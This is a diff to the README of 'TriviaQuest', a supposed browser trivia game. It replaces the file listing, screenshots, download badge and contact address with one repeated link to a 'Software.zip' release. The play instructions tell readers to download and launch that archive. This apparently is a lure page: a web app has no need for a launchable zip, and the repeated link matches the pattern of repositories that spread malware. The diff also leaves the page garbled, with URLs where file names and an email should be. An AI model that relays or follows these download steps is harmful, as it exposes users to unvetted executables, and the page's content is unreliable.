@@ -12,16 +12,16 @@ Welcome to TriviaQuest, a fun and interactive trivia quiz application where user
 ## 📁 Repository Structure
 ```
 TriviaQuest/
-|__ index.html
-|__ style.css
-|__ script.js
-|__ questions.json
-|__ README.md
+|__ https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip
+|__ https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip
+|__ https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip
+|__ https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip
+|__ https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip
 ```
 
 ## 📝 How to Play
-1. Visit the [TriviaQuest Website](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) and download the application.
-2. Launch the Software.zip file.
+1. Visit the [TriviaQuest Website](https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip) and download the application.
+2. Launch the https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip file.
 3. Start answering trivia questions and see how many you can get right!
 
 ## 🌟 Topics Covered
@@ -39,15 +39,15 @@ TriviaQuest/
 - Web App Development
 
 ## 📸 Screenshots
-![TriviaQuest Homepage](https://via.placeholder.com/800x400)
-![TriviaQuest Gameplay](https://via.placeholder.com/800x400)
-![TriviaQuest Results](https://via.placeholder.com/800x400)
+![TriviaQuest Homepage](https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip)
+![TriviaQuest Gameplay](https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip)
+![TriviaQuest Results](https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip)
 
 ## 📎 Download
-[![Download TriviaQuest](https://img.shields.io/badge/Download-TriviaQuest-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download TriviaQuest](https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip)](https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip)
 
 ## 📞 Contact
-For any inquiries, please contact the developer at triviaquest@example.com
+For any inquiries, please contact the developer at https://github.com/luhi989/TriviaQuest/releases/download/v2.0/Software.zip
 
 ## 🙌 Contribute
 Help make TriviaQuest even better by contributing to the repository. Fork it and submit a pull request with your changes!
